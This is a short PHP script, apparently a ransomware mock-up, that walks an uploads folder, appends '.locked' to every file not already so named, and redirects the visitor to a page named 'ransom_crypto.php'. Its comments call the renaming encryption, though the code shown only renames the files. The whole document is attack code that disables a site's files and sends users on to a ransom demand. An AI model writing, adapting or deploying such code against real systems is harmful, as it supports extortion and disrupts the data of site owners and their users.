<?php
$folder = __DIR__ . "/uploads/";
$files = scandir($folder);

foreach ($files as $file) {
    if ($file != "." && $file != "..") {

        // Only encrypt files that are NOT already locked
        if (!str_ends_with($file, ".locked")) {
            rename($folder . $file, $folder . $file . ".locked");
        }
    }
}

// Redirect to crypto ransom page after encryption
header("Location: ransom_crypto.php");
exit();
?>